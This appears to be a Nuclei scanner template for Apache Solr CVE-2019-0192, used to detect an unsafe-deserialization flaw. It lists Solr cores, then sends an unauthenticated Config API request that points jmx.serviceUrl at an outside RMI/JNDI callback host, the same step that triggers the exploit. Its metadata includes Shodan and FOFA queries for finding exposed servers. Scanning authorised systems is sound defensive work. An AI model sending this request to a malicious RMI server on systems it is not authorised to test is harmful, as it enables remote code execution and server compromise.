flow: http(1) && http(2)
http:
- extractors:
  - internal: true
    json:
    - .status | .[].name
    name: core_name
    type: json
  raw:
  - 'GET /solr/admin/cores?wt=json HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "dns")
    - contains(body, "javax.management.remote.rmi")
    - contains(content_type, "text/plain")
    - status_code == 500
    type: dsl
  raw:
  - 'POST /solr/{{core_name}}/config HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"set-property":{"jmx.serviceUrl":"service:jmx:rmi:///jndi/rmi://{{interactsh-url}}/obj"}}

    '
id: CVE-2019-0192
info:
  author: hnd3884
  classification:
    cpe: cpe:2.3:a:apache:solr:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-0192
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.99768
    epss-score: 0.9304
  description: 'In Apache Solr versions 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5, the Config
    API allows to configure the JMX server via an HTTP POST request. By pointing it
    to a malicious RMI server, an attacker could take advantage of Solr''s unsafe
    deserialization to trigger remote code execution on the Solr side.

    '
  impact: 'Unauthenticated attackers can trigger remote code execution via unsafe
    deserialization by pointing the JMX server to a malicious RMI server, leading
    to complete Solr server compromise.

    '
  metadata:
    fofa-query: title="Solr
    max-request: 2
    product: solr
    shodan-query: title:"Solr"
    vendor: apache
  name: Apache Solr - Deserialization of Untrusted Data
  reference:
  - https://github.com/Imanfeng/Apache-Solr-RCE
  - https://nvd.nist.gov/vuln/detail/CVE-2019-0192
  remediation: 'Upgrade to Apache Solr version 5.5.6, 6.6.6, or later versions that
    are not vulnerable.

    '
  severity: critical
  tags: cve,cve2019,apache,solr,deserialization,rce,oast,vkev,vuln
